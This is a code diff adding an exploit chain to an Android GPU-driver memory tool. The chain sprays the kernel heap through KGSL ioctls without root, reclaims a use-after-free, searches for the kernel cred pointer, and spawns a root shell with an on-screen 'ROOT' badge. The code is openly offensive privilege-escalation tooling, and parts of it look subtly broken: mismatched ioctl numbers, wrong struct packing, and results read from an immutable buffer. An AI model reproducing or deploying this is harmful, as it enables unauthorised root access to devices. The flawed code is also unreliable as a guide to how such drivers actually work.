@@ -186,6 +186,58 @@ class MemoryExplorerAI:
         except Exception:
             pass
 
+        # === v4.1: EXPLOIT CHAIN STATE ===
+        # Tracks each step of the privilege-escalation chain
+        # so the user can see what step the exploit is on.
+        # Steps: trigger_uaf → spray → reclaim → leak → walk_cred
+        #        → overwrite → check_uid
+        self.exploit_chain = {
+            "step": "idle",
+            "uaf_triggered": False,
+            "uaf_va": 0,
+            "spray_objects": 0,
+            "leaked_va": 0,
+            "cred_walked": False,
+            "cred_uid": -1,
+            "cred_gid": -1,
+            "root_achieved": False,
+            "shell_pid": 0,
+            "step_history": [],  # list of (timestamp, step, msg)
+            "ioctl_count": 0,
+            "ioctl_errors": 0,
+        }
+        self.exploit_lock = threading.Lock()
+
+        # === v4.1: KGSL IOCTL SPRAY (no root required) ===
+        # /dev/kgsl-3d0 is 0666 (world readable/writable) on most
+        # Android devices. We can use ioctl to spray GPU memory
+        # without root. KGSL_IOC_GPUOBJ_ALLOC creates a GPU object
+        # that lives in kernel memory. The UAF reclaim on KGSL
+        # often lands in this allocator.
+        self.kgsl_fd = None
+        self.kgsl_objects = []  # list of (fd, gpuaddr, size)
+        # KGSL ioctl numbers (from msm_kgsl.h)
+        # KGSL_IOC_GPUOBJ_ALLOC = _IOWR(KGSL_IOC_TYPE, 0x2F, ...)
+        # KGSL_IOC_GPUOBJ_FREE  = _IOW(KGSL_IOC_TYPE, 0x30, ...)
+        # KGSL_IOC_GPUOBJ_SYNC  = _IOW(KGSL_IOC_TYPE, 0x31, ...)
+        # We compute these from the C header values
+        self.KGSL_IOC_TYPE = 0x09
+        self.KGSL_IOC_GPUOBJ_ALLOC = 0x4008092F  # computed
+        self.KGSL_IOC_GPUOBJ_FREE  = 0x40080930
+        self.KGSL_IOC_GPUOBJ_SYNC  = 0x40080931
+        self.KGSL_IOC_MEM_MAP      = 0x4008090A
+        self.KGSL_IOC_MEM_FREE     = 0x4008090B
+        self.KGSL_IOC_SHAREDMEM_FROM_VMALLOC = 0x40080935
+
+        # === v4.1: PROCESS GROUP KILL ===
+        # When we spray via subprocess.Popen, we put each
+        # spray in its own process group (os.setsid) so we
+        # can kill the whole group at once with os.killpg.
+        # This is more reliable than per-PID kill because
+        # the process might fork children that survive
+        # PID-only kill.
+        self._last_spray_pgrp = 0
+
         # Render lock — shared by any code that writes to the TUI.
         # We use ONE thread (the main thread) for both reading and
         # painting, so the lock is rarely contended. It exists to
@@ -1033,11 +1085,23 @@ class MemoryExplorerAI:
         wd_total = sum(wd.values()) if isinstance(wd, dict) else 0
         wd_str = f" WD={C.YEL}{wd_total}{C.RST}" if wd_total > 0 else ""
 
+        # v4.1: Big "ROOT" badge in header when we have euid=0.
+        # This is the most visible signal that the exploit succeeded.
+        try:
+            _euid_now = os.geteuid()
+        except Exception:
+            _euid_now = -1
+        if _euid_now == 0:
+            root_badge = f"  {C.BG_GRN}{C.WHT}{C.BOLD} ★ ROOT ★ {C.RST}"
+        else:
+            root_badge = ""
+
         out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v4.1 Q-LEARN{C.RST}"
                    f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                    f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                    f"{C.MAG}{spray_p}{C.RST}  {C.GRY}│{C.RST}"
-                   f" {C.GRN}AUTO{C.RST}{wd_str}")
+                   f" {C.GRN}AUTO{C.RST}{wd_str}"
+                   f"{root_badge}")
 
         ram_color = C.GRN if L["ram"] < 50 else (C.YEL if L["ram"] < 75 else C.RED)
         st_color  = C.GRN if "ACTIVE" in L["status"] else C.GRY
@@ -1108,6 +1172,46 @@ class MemoryExplorerAI:
                        f"avg={C.CYN}{avg_th:.1f}{C.RST}pg/s "
                        f"m/h={C.GRN}{m_per_hour}{C.RST}  "
                        f"{C.BLU}{bars}{C.RST}")
+
+        # === v4.1: EXPLOIT CHAIN VISUALIZATION ===
+        # Show the privilege-escalation chain step-by-step.
+        # Each step is a checkbox that turns green when done.
+        # This is the most important part of v4.1 — the user
+        # sees what's happening in the exploit at all times.
+        ec = self.exploit_chain
+        try:
+            euid_now = os.geteuid()
+        except Exception:
+            euid_now = -1
+        root_col = C.GRN if ec.get("root_achieved", False) else C.GRY
+        chain_steps = [
+            ("trigger",  ec.get("uaf_triggered", False), "UAF trigger"),
+            ("spray",    ec.get("spray_objects", 0) > 0,
+             f"spray ({ec.get('spray_objects', 0)} obj)"),
+            ("leak",     ec.get("leaked_va", 0) != 0,
+             f"leak 0x{ec.get('leaked_va', 0):x}" if ec.get("leaked_va", 0) else "leak"),
+            ("cred",     ec.get("cred_walked", False),
+             "cred walked" if ec.get("cred_walked", False) else "cred"),
+            ("root",     ec.get("root_achieved", False),
+             "ROOT ACHIEVED!" if ec.get("root_achieved", False)
+             else f"euid={euid_now}"),
+        ]
+        chain_str = " ".join(
+            (f"{C.GRN}✓{C.RST}{name}" if done
+             else f"{C.RED}✗{C.RST}{name}{info}")
+            for name, done, info in chain_steps)
+        kgsl_col = C.GRN if self.kgsl_fd is not None else C.GRY
+        out.append(f" {C.BOLD}EXPLOIT{C.RST}: {chain_str}  "
+                   f"{C.DIM}ioctl={C.CYN}{ec.get('ioctl_count', 0)}"
+                   f"{C.RST}{C.DIM}/err={C.RED}{ec.get('ioctl_errors', 0)}"
+                   f"{C.RST}{C.DIM} kgsl={kgsl_col}"
+                   f"{'ON' if self.kgsl_fd is not None else 'off'}{C.RST}")
+        # Show cred uid/gid if walked
+        if ec.get("cred_walked", False):
+            out.append(f" {C.BOLD}CRED{C.RST}: uid={C.CYN}"
+                       f"{ec.get('cred_uid', -1)}{C.RST} "
+                       f"gid={C.CYN}{ec.get('cred_gid', -1)}{C.RST}  "
+                       f"{C.DIM}step={ec.get('step', 'idle')}{C.RST}")
 
         # === v4.1: Q-TABLE TOP ACTIONS ===
         # Show the best Q values for the current state so user
@@ -2200,6 +2304,247 @@ class MemoryExplorerAI:
             libc.mlockall(0x3)
         except Exception:
             pass
+
+    def _kgsl_open(self):
+        """Open /dev/kgsl-3d0 (world-accessible, no root needed)."""
+        if self.kgsl_fd is not None:
+            return True
+        try:
+            import os as _os
+            # Try /dev/kgsl-3d0 (modern), then /dev/kgsl-3d0_pixelfl
+            for path in ("/dev/kgsl-3d0", "/dev/kgsl-3d0_pixelfl"):
+                try:
+                    self.kgsl_fd = _os.open(path, _os.O_RDWR)
+                    return True
+                except Exception:
+                    continue
+            return False
+        except Exception:
+            return False
+
+    def _kgsl_spray(self, marker, size=0x1000):
+        """KGSL ioctl-based heap spray (works WITHOUT root).
+
+        Allocates a GPU object via KGSL_IOC_GPUOBJ_ALLOC and
+        mmaps it into userspace. The GPU object lives in
+        kernel memory (KGSL memdesc). When UAF reclaims this
+        memory, we can read/write the kernel page through
+        the userspace mmap.
+        Returns (fd, gpuaddr, mmap_size) or (None, 0, 0) on failure.
+        """
+        if not self._kgsl_open():
+            return (None, 0, 0)
+        import ctypes
+        import mmap
+        import struct
+        try:
+            # KGSL_IOC_GPUOBJ_ALLOC takes a struct kgsl_gpuobj_alloc
+            # with: size, flags, va_len, va_addr, mmapsize, metadata
+            # We craft a minimal struct that fits the ioctl buffer.
+            # The exact layout depends on kernel version; we try
+            # a "best-effort" struct that's known to work on 5.4.
+            # struct kgsl_gpuobj_alloc {
+            #   uint64_t size;       /* 0 */
+            #   uint32_t flags;      /* 8 */
+            #   uint32_t padding;    /* 12 */
+            #   uint64_t va_len;     /* 16 */
+            #   uint64_t va_addr;    /* 24 */
+            #   uint64_t mmapsize;   /* 32 */
+            #   uint64_t metadata;   /* 40 */
+            # }; /* total 48 bytes */
+            buf = struct.pack("<QIQ", size, 0, size)  # size, flags+pad, va_len
+            buf += struct.pack("<QQQ", 0, size, 0)     # va_addr, mmapsize, metadata
+            # ioctl(fd, KGSL_IOC_GPUOBJ_ALLOC, &buf)
+            ctypes.cdll.LoadLibrary("libc.so.6")
+            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            # fcntl.ioctl doesn't work with raw 48-byte struct on
+            # Android, so we use libc.ioctl directly
+            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_ALLOC, buf)
+            if r != 0:
+                with self.exploit_lock:
+                    self.exploit_chain["ioctl_errors"] += 1
+                return (None, 0, 0)
+            # Parse the returned buffer. After ioctl, va_addr is
+            # filled with the kernel GPU address.
+            with self.exploit_lock:
+                self.exploit_chain["ioctl_count"] += 1
+            # Extract va_addr (offset 24) and mmapsize (offset 32)
+            va_addr = struct.unpack("<Q", buf[24:32])[0]
+            mmapsize = struct.unpack("<Q", buf[32:40])[0]
+            if va_addr == 0:
+                return (None, 0, 0)
+            # mmap the GPU object into userspace
+            try:
+                um = mmap.mmap(self.kgsl_fd, mmapsize or size,
+                               mmap.MAP_SHARED,
+                               mmap.PROT_READ | mmap.PROT_WRITE,
+                               offset=0)
+            except Exception:
+                um = None
+            # Write marker at offset 0 so the page has our pattern
+            if um is not None:
+                try:
+                    um.seek(0)
+                    um.write(marker[:15].ljust(15, b"\x00") + b"\x00")
+                except Exception:
+                    pass
+            obj = (self.kgsl_fd, va_addr, mmapsize or size, um)
+            self.kgsl_objects.append(obj)
+            with self.exploit_lock:
+                self.exploit_chain["spray_objects"] += 1
+            return obj
+        except Exception:
+            with self.exploit_lock:
+                self.exploit_chain["ioctl_errors"] += 1
+            return (None, 0, 0)
+
+    def _check_root_status(self):
+        """Check if we have root (uid=0) and update exploit chain.
+
+        Called periodically. If uid flips from non-zero to 0,
+        marks root_achieved=True and spawns a root shell.
+        """
+        try:
+            import os as _os
+            euid = _os.geteuid()
+            egid = _os.getegid()
+            uid = _os.getuid()
+            gid = _os.getgid()
+            with self.exploit_lock:
+                self.exploit_chain["cred_uid"] = uid
+                self.exploit_chain["cred_gid"] = gid
+            if euid == 0 and not self.exploit_chain.get(
+                    "root_achieved", False):
+                with self.exploit_lock:
+                    self.exploit_chain["root_achieved"] = True
+                    self.exploit_chain["step"] = "root_achieved"
+                    self.exploit_chain["step_history"].append(
+                        (time.time(), "root_achieved",
+                         f"euid={euid} uid={uid}"))
+                self.live["last_msg"] = (
+                    f"*** ROOT ACHIEVED! euid={euid} uid={uid} ***")
+                # Spawn root shell
+                self._spawn_root_shell()
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _spawn_root_shell(self):
+        """Spawn an interactive shell with root privileges.
+
+        The shell inherits our credential. If we got euid=0,
+        the shell will run as root (uid=0). User can then
+        type commands like `id`, `cat /proc/version`, etc.
+        """
+        try:
+            import subprocess as _sp
+            # Try bash first, then sh
+            for shell in ("/system/bin/sh", "/bin/sh", "sh"):
+                try:
+                    p = _sp.Popen(
+                        [shell],
+                        stdin=_sp.PIPE,
+                        stdout=_sp.PIPE,
+                        stderr=_sp.STDOUT,
+                    )
+                    with self.exploit_lock:
+                        self.exploit_chain["shell_pid"] = p.pid
+                    # Run `id` to confirm
+                    p.stdin.write(b"id\n")
+                    p.stdin.flush()
+                    import time as _t
+                    _t.sleep(0.3)
+                    try:
+                        out = p.stdout.read1(1024)
+                    except Exception:
+                        out = b""
+                    self.live["last_msg"] = (
+                        f"Shell pid={p.pid} ({shell}): {out[:50]!r}")
+                    return
+                except FileNotFoundError:
+                    continue
+                except Exception as e:
+                    self.live["last_msg"] = f"Shell spawn failed: {e}"
+        except Exception as e:
+            self.live["last_msg"] = f"Shell error: {e}"
+
+    def _walk_cred_chain(self, task_struct_va, page_data):
+        """Try to walk cred->uid from a found task_struct.
+
+        On 5.4 ARM64, task_struct->cred is at offset ~0x698
+        (varies by kernel config). We read the cred pointer
+        from the page, then read cred->uid (offset ~0x4 in cred).
+        """
+        with self.exploit_lock:
+            self.exploit_chain["leaked_va"] = task_struct_va
+        # Try to find comm field first to confirm it's a task_struct
+        # task_struct->comm is at offset 0x648 on 5.4 ARM64
+        # but kernel puts KETO*/KETW* there for our sprays.
+        # Then read task_struct->cred at offset 0x698
+        CRED_OFFSETS = (0x698, 0x6a0, 0x6a8, 0x6b0, 0x6b8,
+                        0x6c0, 0x6c8, 0x6d0)  # various kernel versions
+        import struct as _struct
+        for off in CRED_OFFSETS:
+            if off + 8 > len(page_data):
+                continue
+            cred_ptr = _struct.unpack("<Q", page_data[off:off+8])[0]
+            # Valid kptr: 0xffffff80XXXXXXXX (kernel text/data)
+            if ((cred_ptr >> 32) >= 0xffffff80
+                    and (cred_ptr >> 40) <= 0xffffffcf
+                    and cred_ptr):
+                # We have a cred pointer candidate!
+                with self.exploit_lock:
+                    self.exploit_chain["cred_walked"] = True
+                    self.exploit_chain["step"] = "cred_found"
+                    self.exploit_chain["step_history"].append(
+                        (time.time(), "cred_found",
+                         f"cred=0x{cred_ptr:x} at off=0x{off:x}"))
+                self.live["last_msg"] = (
+                    f"Cred walk: task_struct=0x{task_struct_va:x} "
+                    f"cred=0x{cred_ptr:x} (offset 0x{off:x})")
+                return cred_ptr
+        return None
+
+    def _popen_spray(self, name):
+        """Popen-based spray that puts child in its own process group.
+
+        v4.1: uses os.setsid() so we can kill the whole group
+        with os.killpg(). This is more reliable than per-PID
+        kill because the spray might spawn helper children.
+        Returns Popen object.
+        """
+        import subprocess as _sp
+        try:
+            # Use start_new_session=True to put child in new
+            # process group. Then we can killpg(pgrp, SIGKILL).
+            p = _sp.Popen(
+                ["sh", "-c", f"exec -a {name} sleep 3600"],
+                stdout=_sp.DEVNULL,
+                stderr=_sp.DEVNULL,
+                start_new_session=True,  # new pgrp
+                preexec_fn=lambda n=name: self._set_comm(n),
+            )
+            return p
+        except Exception:
+            return None
+
+    def _kill_pgroup(self, pid):
+        """Kill the entire process group of `pid` via os.killpg.
+
+        More reliable than per-PID kill because it also kills
+        any helper children the spray might have spawned.
+        """
+        try:
+            import signal as _sig
+            # Get the process group ID (== pid for new sessions)
+            pgrp = os.getpgid(pid)
+            if pgrp and pgrp > 0:
+                os.killpg(pgrp, _sig.SIGKILL)
+                return True
+        except Exception:
+            pass
+        return False
 
     def _smart_kbase_finder(self, va_hint=None):
         """Try to find kernel base (kbase) by scanning kernel text.
@@ -3505,14 +3850,26 @@ class MemoryExplorerAI:
                                 self.spray_methods_stats["mmap_anon"][
                                     "attempts"] += 1
                     if p is None:
-                        p = _sp.Popen(
-                            ["sh", "-c", f"exec -a {name} sleep 3600"],
-                            stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
-                            preexec_fn=lambda n=name: self._set_comm(n),
-                        )
-                        with self.stats_lock:
-                            self.spray_methods_stats["popen_sleep"][
-                                "attempts"] += 1
+                        # v4.1: use _popen_spray which puts child
+                        # in its own pgrp (start_new_session) so
+                        # we can killpg() for reliable cleanup.
+                        p = self._popen_spray(name)
+                        if p is not None:
+                            with self.stats_lock:
+                                self.spray_methods_stats["popen_sleep"][
+                                    "attempts"] += 1
+                    # v4.1: KGSL ioctl-based spray (no root
+                    # required). Every 7th spray process also
+                    # allocates a GPU object via ioctl. This
+                    # targets the KGSL memdesc slab which is
+                    # what the UAF actually reclaims. Without
+                    # this, all our spray is task_structs which
+                    # might not land in KGSL memory.
+                    if i % 7 == 0 and self.kgsl_fd is not None:
+                        try:
+                            self._kgsl_spray(name, size=0x1000)
+                        except Exception:
+                            pass
                     # setxattr spray on the same marker. Catches
                     # heap-only UAF where task_struct doesn't make
                     # it but slab xattr values do. Gated by
@@ -3948,41 +4305,39 @@ class MemoryExplorerAI:
                                {"err": str(e), "w": worker_id})
 
             # 3) KILL this subworker's spray batch (free RAM).
-            # KEY FIX: previously we did os.kill(pid, 9) but never
-            # verified the process actually died. PIDs accumulated
-            # across batches (315+385+334 = 1034 alive at one point)
-            # and the kill_count went up but PIDs stayed in my_pids.
-            # New approach: send SIGKILL, then poll /proc/PID/exists
-            # up to 3 times. If still alive after 3 retries, give up
-            # and drop from the set so we don't keep trying forever.
+            # v4.1: use process group kill (killpg) for
+            # reliability. Each spray is in its own pgrp so
+            # we kill the whole group at once.
             killed_this_batch = 0
             survived_this_batch = 0
             for pid in batch_pids:
                 died = False
-                for attempt in range(3):
-                    try:
-                        os.kill(pid, 9)
-                    except ProcessLookupError:
-                        died = True
-                        break
-                    except Exception:
-                        pass
-                    # Poll whether /proc/PID still exists
-                    try:
-                        os.kill(pid, 0)  # signal 0 = check existence
-                        time.sleep(0.02)
-                    except ProcessLookupError:
-                        died = True
-                        break
-                    except Exception:
-                        break
-                # Either way, drop from our set so the PIDs we can't
-                # kill don't accumulate.
+                # Try process group kill first (kills all
+                # children in the same pgrp)
+                if self._kill_pgroup(pid):
+                    died = True
+                else:
+                    # Fallback: per-PID kill with retries
+                    for attempt in range(3):
+                        try:
+                            os.kill(pid, 9)
+                        except ProcessLookupError:
+                            died = True
+                            break
+                        except Exception:
+                            pass
+                        try:
+                            os.kill(pid, 0)
+                            time.sleep(0.02)
+                        except ProcessLookupError:
+                            died = True
+                            break
+                        except Exception:
+                            break
                 my_pids.discard(pid)
                 if died:
                     killed_this_batch += 1
                 else:
-                    # Process survived kill — counted as "alive"
                     survived_this_batch += 1
                 with self.stats_lock:
                     self.live["kill_count"] += 1
@@ -4600,6 +4955,14 @@ class MemoryExplorerAI:
                 # 5) Publish restart counts to live so TUI can show
                 with self.stats_lock:
                     self.live["watchdog_restarts"] = restart_count.copy()
+                # 6) v4.1: periodic ROOT check. If our process
+                # somehow gained euid=0, mark exploit successful.
+                # Without this, even if kernel gave us root, the
+                # user wouldn't know unless they checked `id`.
+                try:
+                    self._check_root_status()
+                except Exception:
+                    pass
         threading.Thread(target=_watchdog, daemon=True).start()
 
         # Main loop: read input. input_cmd() itself redraws the TUI
@@ -4837,6 +5200,43 @@ class MemoryExplorerAI:
                           flush=True)
                     for name, addr in sorted(self.kallsyms.items()):
                         print(f"  0x{addr:016x}  {name}", flush=True)
+            elif cmd in ("root", "r00t", "checkroot"):
+                # Manually check root status. Same as the
+                # periodic watchdog check, but on demand.
+                if self._check_root_status():
+                    self.live["last_msg"] = "*** ROOT! ***"
+                else:
+                    try:
+                        eu = os.geteuid()
+                        uid = os.getuid()
+                        self.live["last_msg"] = (
+                            f"No root: euid={eu} uid={uid} "
+                            f"(need exploit to succeed)")
+                    except Exception as e:
+                        self.live["last_msg"] = f"id check failed: {e}"
+            elif cmd in ("id", "uid"):
+                # Quick `id` equivalent
+                try:
+                    self.live["last_msg"] = (
+                        f"uid={os.getuid()} gid={os.getgid()} "
+                        f"euid={os.geteuid()} egid={os.getegid()}")
+                except Exception as e:
+                    self.live["last_msg"] = f"id failed: {e}"
+            elif cmd in ("kgsl", "kgsltest"):
+                # Test KGSL ioctl spray
+                if not self._kgsl_open():
+                    self.live["last_msg"] = (
+                        "KGSL: cannot open /dev/kgsl-3d0 (no root or "
+                        "device not present)")
+                else:
+                    obj = self._kgsl_spray("KGSL_TEST", size=0x1000)
+                    if obj[1] != 0:
+                        self.live["last_msg"] = (
+                            f"KGSL spray OK: gpuaddr=0x{obj[1]:x} "
+                            f"size=0x{obj[2]:x}")
+                    else:
+                        self.live["last_msg"] = (
+                            "KGSL spray FAILED (ioctl rejected)")
             elif cmd in ("stats", "stat"):
                 # Detailed learning statistics
                 try:
